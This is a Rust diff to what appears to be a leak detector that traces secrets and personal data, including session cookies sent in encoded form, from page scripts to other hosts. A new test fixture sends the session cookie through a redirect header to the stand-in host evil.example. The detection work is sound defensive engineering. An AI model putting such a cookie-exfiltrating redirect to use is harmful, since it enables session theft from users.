@@ -170,7 +170,7 @@ impl Browser {
             let method = arg("method")?.as_str()?;
             let path = arg("path")?.as_str()?;
             let headers = pairs(arg("headers"));
-            let body = arg("body").and_then(Value::as_str);
+            let body = arg("body").and_then(crate::value::some).and_then(Value::as_str);
             let request = request_for(&base, method, path, &headers, body)?;
             let (back, answer) = mpsc::channel();
             tx.send((request, back)).ok()?;
@@ -381,7 +381,13 @@ pub fn request_for(base: &Value, method: &str, target: &str, headers: &[(String,
             o.insert("query".into(), Value::Array(decode_pairs(query)));
         }
         let form = body.filter(|_| {
-            headers.iter().all(|(k, v)| !k.eq_ignore_ascii_case("content-type") || v.contains("x-www-form-urlencoded") || v.contains("text/plain"))
+            headers.iter().all(|(k, v)| {
+                if !k.eq_ignore_ascii_case("content-type") {
+                    return true;
+                }
+                let essence = v.split(';').next().unwrap_or_default().trim_matches([' ', '\t', '\r', '\n']);
+                essence.eq_ignore_ascii_case("application/x-www-form-urlencoded") || essence.eq_ignore_ascii_case("text/plain")
+            })
         });
         if o.get("form").is_some_and(Value::is_array) {
             o.insert("form".into(), Value::Array(form.map(decode_pairs).unwrap_or_default()));
@@ -446,6 +452,8 @@ struct Sources {
     tails: BTreeMap<String, String>,
     /// Canaries a host result labelled `html` (trusted markup) carries.
     trusted: BTreeSet<String>,
+    /// Deduplicate tails as the session learns more sources.
+    texts: BTreeSet<String>,
 }
 
 impl Sources {
@@ -462,31 +470,44 @@ impl Sources {
         if let Some(c) = CANARY.find(&s.fragment) {
             from.insert(c.as_str().to_string(), ("the page URL's fragment (location.hash)".into(), "fragment".into()));
         }
-        let mut texts: BTreeSet<String> = BTreeSet::new();
-        let mut trusted = BTreeSet::new();
-        for r in std::iter::once(page).chain(&s.nested) {
-            for a in &r.spec.args {
-                crate::output::strings(a, &mut texts);
-            }
-            trusted.extend(crate::labels::trusted_html(r, m));
-            for e in &r.events {
-                let Some(v) = &e.result else { continue };
-                let mut ss = BTreeSet::new();
-                crate::output::strings(v, &mut ss);
-                for t in &ss {
-                    for c in CANARY.find_iter(t) {
-                        from.entry(c.as_str().to_string()).or_insert_with(|| {
-                            let f = format!("a string {} returned", e.func);
-                            (f.clone(), f)
-                        });
-                    }
-                }
-                texts.extend(ss);
-            }
+        let mut out = Sources { from, tails: BTreeMap::new(), trusted: BTreeSet::new(), texts: BTreeSet::new() };
+        out.add(page, m);
+        out.text(&s.fragment);
+        out
+    }
+
+    fn add(&mut self, r: &RunRecord, m: &Manifest) {
+        let mut texts = BTreeSet::new();
+        for a in &r.spec.args {
+            crate::output::strings(a, &mut texts);
         }
-        texts.insert(s.fragment.clone());
-        let tails = crate::labels::tails_in(texts.iter().map(String::as_str));
-        Sources { from, tails, trusted }
+        self.trusted.extend(crate::labels::trusted_html(r, m));
+        for e in &r.events {
+            let Some(v) = &e.result else { continue };
+            let mut returned = BTreeSet::new();
+            crate::output::strings(v, &mut returned);
+            for text in &returned {
+                for c in CANARY.find_iter(text) {
+                    self.from.entry(c.as_str().to_string()).or_insert_with(|| {
+                        let from = format!("a string {} returned", e.func);
+                        (from.clone(), from)
+                    });
+                }
+            }
+            texts.extend(returned);
+        }
+        for text in texts {
+            self.text(&text);
+        }
+    }
+
+    fn text(&mut self, text: &str) {
+        if !CANARY.is_match(text) || !self.texts.insert(text.into()) {
+            return;
+        }
+        for (canary, tail) in crate::labels::tails_in(std::iter::once(text)) {
+            self.tails.entry(canary).or_default().push_str(&tail);
+        }
     }
 
     fn sent(&self, c: &str) -> &str {
@@ -500,6 +521,8 @@ struct TracedValue {
     place: String,
     /// Stable finding identity, independent of how the source is described.
     key: String,
+    /// The browser call that returned this source; page values start known.
+    after: u32,
 }
 
 /// Traced personal data and secrets: values at `pii` and `secret` result
@@ -510,9 +533,11 @@ fn traced(page: &RunRecord, s: &Session, m: &Manifest) -> Vec<TracedValue> {
         label: Label::Secret,
         place: "the browser's readable session cookie".into(),
         key: format!("the session cookie {COOKIE}"),
+        after: 0,
     }];
     let mut seen: BTreeSet<(String, Label)> = out.iter().map(|t| (t.value.clone(), t.label)).collect();
-    for r in std::iter::once(page).chain(&s.nested) {
+    let returned = s.browser.events.iter().filter(|e| e.func == FETCH_OWN).zip(&s.nested).map(|(e, r)| (e.n, r));
+    for (after, r) in std::iter::once((0, page)).chain(returned) {
         for e in &r.events {
             let Some(v) = &e.result else { continue };
             for (p, l) in m.call_result_labels(&e.func, &e.args) {
@@ -520,7 +545,7 @@ fn traced(page: &RunRecord, s: &Session, m: &Manifest) -> Vec<TracedValue> {
                     for x in crate::labels::values_at(v, &p) {
                         if x.chars().count() >= 4 && seen.insert((x.clone(), l)) {
                             let at = if p.is_empty() { e.func.clone() } else { format!("{} ({p})", e.func) };
-                            out.push(TracedValue { value: x, label: l, key: at.clone(), place: at });
+                            out.push(TracedValue { value: x, label: l, key: at.clone(), place: at, after });
                         }
                     }
                 }
@@ -548,16 +573,18 @@ fn server_flows(page: &RunRecord, session: &Session, m: &Manifest) -> Vec<Findin
     let mut seen: BTreeSet<_> = known.iter().map(|v| (v.value.clone(), v.label, v.response_owner.clone())).collect();
     let mut out = Vec::new();
     for r in &session.nested {
-        let local: BTreeSet<String> = crate::labels::check(r, m).into_iter().map(|f| f.id).collect();
-        for mut f in crate::labels::leaks_from(r, m, &known) {
-            if local.contains(&f.id) {
+        let local: BTreeMap<_, _> =
+            crate::labels::check(r, m).into_iter().chain(crate::payload::check(r, m)).map(|f| (f.id, (f.severity, f.detail["label"] == "secret"))).collect();
+        let inherited = crate::labels::leaks_from(r, m, &known).into_iter().chain(crate::payload::encoded_from(r, m, &known));
+        for mut f in inherited {
+            if local.get(&f.id).is_some_and(|rank| *rank >= (f.severity, f.detail["label"] == "secret")) {
                 continue;
             }
             let cookie = f.detail["func"].as_str() == Some(COOKIE_SOURCE);
             if let Some(value) = f.detail["value"].as_str()
                 && let Some(origin) = origins.get(&(
                     value.to_string(),
-                    if f.kind == "secret_leak" { Label::Secret } else { Label::Pii },
+                    if f.detail["label"] == "secret" { Label::Secret } else { Label::Pii },
                     f.detail["func"].as_str().unwrap_or_default().to_string(),
                     f.detail["path"].as_str().unwrap_or_default().to_string(),
                 ))
@@ -565,7 +592,11 @@ fn server_flows(page: &RunRecord, session: &Session, m: &Manifest) -> Vec<Findin
                 f.detail["source_run"] = json!(origin);
             }
             if cookie {
-                f.title = format!("the browser's readable session cookie ends up in {}", f.detail["place"].as_str().unwrap_or("the server"));
+                f.title = format!(
+                    "the browser's readable session cookie ends up{} in {}",
+                    f.detail["encoding"].as_str().map(|e| format!(" {e}")).unwrap_or_default(),
+                    f.detail["place"].as_str().unwrap_or("the server")
+                );
                 f.detail.as_object_mut().unwrap().remove("func");
                 f.detail["source"] = json!("the browser's readable session cookie");
             }
@@ -621,20 +652,13 @@ pub fn check(page: &RunRecord, s: &Session, m: &Manifest) -> Vec<Finding> {
 
     // Requests, markup and code recorded before a hang or crash remain
     // evidence, even when the guest couldn't finish its session report.
-    let src = Sources::new(page, s, m);
+    let mut src = Sources::new(page, s, m);
+    let mut nested = s.nested.iter();
     let traced = traced(page, s, m);
     let grants_listed = m.grants.lists_hosts();
     let mut destinations: BTreeSet<String> = BTreeSet::new();
     let mut per_item: BTreeMap<String, BTreeSet<String>> = BTreeMap::new();
-    let other_bodies: Vec<(String, String)> = b
-        .events
-        .iter()
-        .filter(|e| e.func == FETCH_OTHER)
-        .filter_map(|e| {
-            let body = e.result.as_ref()?.get("ok")?.get("body")?.as_str()?;
-            (body.trim().len() >= 8).then(|| (body.trim().to_string(), host(arg(e, "url"))))
-        })
-        .collect();
+    let mut other_bodies: Vec<(String, String)> = Vec::new();
 
     for e in &b.events {
         match e.func.as_str() {
@@ -714,6 +738,9 @@ pub fn check(page: &RunRecord, s: &Session, m: &Manifest) -> Vec<Finding> {
                     ));
                 }
                 leaks(e, &traced, &to, &path, ex, run, &detail, &mut out);
+                if let Some(body) = e.result.as_ref().and_then(|v| v["ok"]["body"].as_str()).map(str::trim).filter(|text| text.len() >= 8) {
+                    other_bodies.push((body.to_string(), to));
+                }
             }
             GO => {
                 let (how, url) = (arg(e, "how"), arg(e, "url"));
@@ -767,6 +794,9 @@ pub fn check(page: &RunRecord, s: &Session, m: &Manifest) -> Vec<Finding> {
                     .join("/");
                 if shape.contains("{n}") {
                     per_item.entry(format!("{} {shape}", arg(e, "method"))).or_default().insert(target.to_string());
+                }
+                if let Some(r) = nested.next() {
+                    src.add(r, m);
                 }
             }
             _ => {}
@@ -905,17 +935,38 @@ fn leaks(e: &HostCall, traced: &[TracedValue], to: &str, path: &str, ex: &str, r
     for v in e.args.values() {
         crate::output::strings(v, &mut texts);
     }
-    for TracedValue { value, label, place: at, key } in traced {
-        if !texts.iter().any(|t| t.contains(value.as_str())) {
+    for TracedValue { value, label, place: at, key, after } in traced {
+        if e.n <= *after {
+            continue;
+        }
+        let raw = texts.iter().any(|t| t.contains(value.as_str()));
+        let encoded = (!raw && value.chars().count() >= crate::payload::ENCODED_MIN)
+            .then(|| crate::payload::encodings(value, true).into_iter().find(|(_, n)| texts.iter().any(|t| t.contains(n))))
+            .flatten();
+        if !raw && encoded.is_none() {
             continue;
         }
         let (kind, what) = if *label == Label::Secret { ("secret_leak", "a secret") } else { ("pii_leak", "personal data") };
+        let mut finding_key = format!("{ex}\0browser\0{key}\0{to}");
+        let mut evidence = json!({"value": value, "from": at, "host": to, "call": e.func, "n": e.n, "label": label.name()});
+        let (kind, how) = match encoded {
+            None => (kind, String::new()),
+            Some((encoding, needle)) => {
+                evidence["encoding"] = json!(encoding);
+                evidence["encoded"] = json!(needle);
+                // Encoded PII and secrets share a kind, so keep both labels
+                // when one source returned the same value in both roles.
+                finding_key.push('\0');
+                finding_key.push_str(label.name());
+                ("encoded_flow", format!(" {encoding}"))
+            }
+        };
         out.push(Finding::new(
             kind,
-            &format!("{ex}\0browser\0{key}\0{to}"),
+            &finding_key,
             Severity::Fail,
-            format!("the page's scripts send {what} ({at}) to {to} (page {path})"),
-            detail(json!({"value": value, "from": at, "host": to, "call": e.func, "n": e.n})),
+            format!("the page's scripts send {what} ({at}){how} to {to} (page {path})"),
+            detail(evidence),
             run,
         ));
     }
@@ -968,6 +1019,31 @@ fn clip_to(s: &str, n: usize) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn browser_cookie_response_policy_applies_to_plain_and_encoded_values() {
+        let m: Manifest = toml::from_str("[app]\nwasm='a.wasm'\n[entry]\nexport='handle'\noutput={status='status',headers='headers',body='body'}\n").unwrap();
+        let mut p = crate::envelope::Trace::default().to_record();
+        p.id = "page".into();
+        p.spec.export = "handle".into();
+        p.result = Some(json!({"status":200,"headers":[],"body":""}));
+        let mut s = Session { browser: p.clone(), nested: vec![], report: Value::Null, fragment: String::new() };
+        let cookie = secret_cookie(p.spec.seed);
+        let hex: String = cookie.bytes().map(|b| format!("{b:02x}")).collect();
+        for value in [cookie, hex] {
+            let mut api = p.clone();
+            api.id = "api".into();
+            api.result = Some(json!({"status":200,"headers":[["location",format!("https://evil.example/?v={value}")]],"body":value}));
+            s.nested = vec![api];
+            for (status, leaks) in [(200, false), (301, true), (302, true), (303, true), (307, true), (308, true), (304, false)] {
+                s.nested[0].result.as_mut().unwrap()["status"] = json!(status);
+                let f = check(&p, &s, &m);
+                assert_eq!(f.iter().any(|f| matches!(f.kind.as_str(), "encoded_flow" | "secret_leak")), leaks, "status {status}: {f:?}");
+            }
+            s.nested[0].stdout = value;
+            assert!(check(&p, &s, &m).iter().any(|f| matches!(f.kind.as_str(), "encoded_flow" | "secret_leak")));
+        }
+    }
 
     #[test]
     fn requests_take_the_page_requests_shape() {
